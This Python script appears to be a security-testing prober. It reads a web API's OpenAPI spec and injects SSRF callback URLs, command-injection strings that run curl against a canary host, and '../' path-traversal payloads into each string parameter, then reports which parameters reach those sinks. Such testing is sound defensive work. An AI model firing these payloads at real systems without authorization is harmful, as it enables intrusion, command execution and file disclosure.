#!/usr/bin/env python3
"""Live-HTTP dynamic reachability prober v3 — SSRF (CWE-918) + path traversal (CWE-22)
   + command injection (CWE-78), per-parameter isolation with unique tokens.

Usage: dyn_prober_v3.py <base_url> <canary_host> <sentinel_abs_path> <sentinel_content> [--safe]
  - SSRF/CMD: callbacks to a local listener; /s/<id>=SSRF, /c/<id>=CMD; token => route+param.
  - CWE-22 : inject a path to a planted SENTINEL file; a hit = sentinel content echoed in the response.
  - Each parameter tested INDIVIDUALLY (others benign) so a hit attributes to one route+param.
HONEST: a hit = that route+param drives the sink; mapping to the specific confirmed function
is the next correlation layer. Mutates state -> disposable DB only.
"""
import sys, threading, time, re, requests
from http.server import BaseHTTPRequestHandler, HTTPServer
PORT=9099; CB=[]
class H(BaseHTTPRequestHandler):
    def _h(s):
        m=re.search(r"/([sc])/(\d+)", s.path)
        if m: CB.append((m.group(1), int(m.group(2))))
        s.send_response(200); s.end_headers(); s.wfile.write(b"ok")
    do_GET=_h; do_POST=_h
    def log_message(s,*a): pass
def resolve(spec,schema,d=0):
    if not isinstance(schema,dict) or d>3: return {}
    if "$ref" in schema: schema=spec.get("components",{}).get("schemas",{}).get(schema["$ref"].split("/")[-1],{})
    return {k:v.get("type","string") for k,v in schema.get("properties",{}).items()}
def main():
    a=[x for x in sys.argv[1:] if not x.startswith("--")]
    base=a[0].rstrip("/"); chost=a[1]; sent_path=a[2]; sent_content=a[3]
    srv=HTTPServer(("0.0.0.0",PORT),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
    spec=requests.get(base+"/openapi.json",timeout=10).json(); paths=spec.get("paths",{})
    TOK={}
    def ssrf(desc): i=len(TOK); TOK[i]=desc; return f"http://{chost}:{PORT}/s/{i}"
    def cmds(desc):
        i=len(TOK); TOK[i]=desc; u=f"http://{chost}:{PORT}/c/{i}"
        return [f"x; curl -s {u}", f"x`curl -s {u}`", f"x$(curl -s {u})", f"x| curl -s {u}", f"x && curl -s {u}"]
    trav=sent_path.lstrip("/")
    PATHS=[sent_path, "../"*8+trav, "....//"*8+trav]
    routes=[]
    for path,ops in paths.items():
        for method,op in ops.items():
            M=method.upper()
            if M not in ("GET","POST","PUT","PATCH","DELETE"): continue
            qp=[(p.get("name"),p.get("in"),p.get("schema",{}).get("type","string")) for p in op.get("parameters",[]) if p.get("in") in ("query","path")]
            js=op.get("requestBody",{}).get("content",{}).get("application/json",{}).get("schema")
            routes.append((M,path,qp,resolve(spec,js) if js is not None else {}))
    def benign(t): return "x" if t=="string" else (1 if t in("integer","number") else (True if t=="boolean" else ([] if t=="array" else {})))
    def fire(M,path,qp,bp,target,payload):
        p=path; query={}; body=({} if bp else None)
        for nm,loc,ty in qp:
            v=payload if nm==target else benign(ty)
            if loc=="path": p=p.replace("{%s}"%nm, requests.utils.quote(str(v),safe=""))
            else: query[nm]=v
        p=re.sub(r"\{[^}]+\}","1",p)
        if bp:
            for nm,ty in bp.items(): body[nm]=payload if nm==target else benign(ty)
        try: return requests.request(M,base+p,params=query or None,json=body,timeout=8).text[:6000]
        except Exception: return ""
    hits22=set()
    for M,path,qp,bp in routes:
        targets=[nm for nm,loc,ty in qp if ty=="string"]+[nm for nm,ty in bp.items() if ty=="string"]
        for nm in targets:
            desc=f"{M} {path}  param='{nm}'"
            fire(M,path,qp,bp,nm,ssrf(desc))
            for pl in cmds(desc): fire(M,path,qp,bp,nm,pl)
            for pl in PATHS:
                if sent_content in fire(M,path,qp,bp,nm,pl): hits22.add(desc)
    for M,path,qp,bp in routes: fire(M,path,qp,bp,None,None)   # trigger stored sinks
    time.sleep(1.5)
    ssrf_hits={TOK[i] for k,i in CB if k=="s"}; cmd_hits={TOK[i] for k,i in CB if k=="c"}
    def show(title,s):
        print(f"\n=== {title} ({len(s)}) ===")
        [print("  REACHABLE:",d) for d in sorted(s)] if s else print("  (none)")
    show("SSRF  CWE-918", ssrf_hits); show("Command injection  CWE-78", cmd_hits); show("Path traversal  CWE-22", hits22)
    srv.shutdown()
if __name__=="__main__": main()
